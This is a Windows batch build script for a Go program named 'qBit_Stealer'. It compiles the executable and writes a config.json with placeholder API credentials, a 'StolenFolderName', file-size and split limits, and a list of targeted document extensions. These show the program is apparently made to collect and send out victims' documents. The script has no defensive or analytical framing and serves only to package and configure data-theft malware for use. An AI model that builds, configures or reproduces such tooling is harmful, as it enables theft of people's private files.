@echo off
echo [+] Compiling...
go build -o qBit_Stealer_WinX64.exe .

echo [+] Checking if the compiled folder exists...
if not exist compiled (
    echo [-] The compiled folder does not exist, creating it now...
    mkdir compiled
) else (
    echo [+] The compiled folder exists, deleting files inside it...
    del /Q compiled\*
)

echo [+] Moving the binary to the compiled folder...
move /Y qBit_Stealer_WinX64.exe compiled\

echo [+] Creating config.json in the compiled folder...
(
echo {
echo     "API": {
echo         "id": "example@mail.com",
echo         "password": "p1ssw0rd"
echo     },
echo     "Path": "F:\testfolder",
echo     "StolenFolderName": "test_name",
echo     "MaxFileSizeMB": 150,
echo     "SplitSize": 50,
echo     "TargetedFileExtensions": [".txt", ".pdf", ".docx"],
echo     "Mode": "MANUAL"
echo }
) > compiled\config.json

echo [+] Done.